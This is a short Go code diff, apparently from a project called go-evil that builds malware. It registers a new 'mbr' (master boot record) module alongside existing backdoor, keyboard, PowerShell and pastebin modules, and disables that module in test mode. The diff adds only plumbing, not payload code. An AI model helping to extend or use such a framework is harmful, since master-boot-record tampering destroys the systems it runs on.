@@ -33,6 +33,7 @@ const (
 	net            = "\tnet \"github.com/s9rA16Bf4/go-evil/domains/network/private\""
 	pwsh           = "\tpwsh \"github.com/s9rA16Bf4/go-evil/domains/powershell/private\""
 	pastebin       = "\tpastebin \"github.com/s9rA16Bf4/go-evil/domains/pastebin/private\""
+	mbr            = "\tmbr \"github.com/s9rA16Bf4/go-evil/domains/mbr/private\""
 
 	// Related to webview
 	loader_x86 = "https://github.com/webview/webview/raw/master/dll/x86/WebView2Loader.dll"
@@ -99,6 +100,11 @@ func Append_domain(domain string) {
 			notify.Log("Adding library 'pastebin'", notify.Verbose_lvl, "2")
 			domains = append(domains, pastebin)
 		}
+	case "mbr":
+		if !find(mbr) && !mal.Is_disabled("mbr") {
+			notify.Log("Adding library 'MBR'", notify.Verbose_lvl, "2")
+			domains = append(domains, mbr)
+		}
 	}
 }
 
@@ -125,6 +131,7 @@ func Set_testMode(new_mode bool) {
 		mal.Disable_domain("back")     // Backdoor
 		mal.Disable_domain("keyboard") // Keyboard
 		mal.Disable_domain("pastebin") // pastebin
+		mal.Disable_domain("mbr")      // Master boot record
 	}
 }
 
